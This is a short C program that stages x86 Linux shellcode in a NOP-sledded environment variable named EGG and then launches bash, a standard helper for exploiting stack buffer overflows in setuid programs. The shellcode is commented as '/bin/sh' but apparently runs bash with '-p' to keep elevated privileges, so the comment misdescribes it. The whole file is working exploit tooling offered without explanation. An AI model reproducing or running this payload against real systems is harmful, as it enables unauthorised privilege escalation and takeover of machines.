#include <unistd.h>
#define NOP 0x90
 
// /bin/sh
char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";
int main() {
 
	char shell[512];
	memset(shell, NOP, 512);
	memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
	setenv("EGG", shell, 1);
	putenv(shell);
	system("bash");
	return 0;
}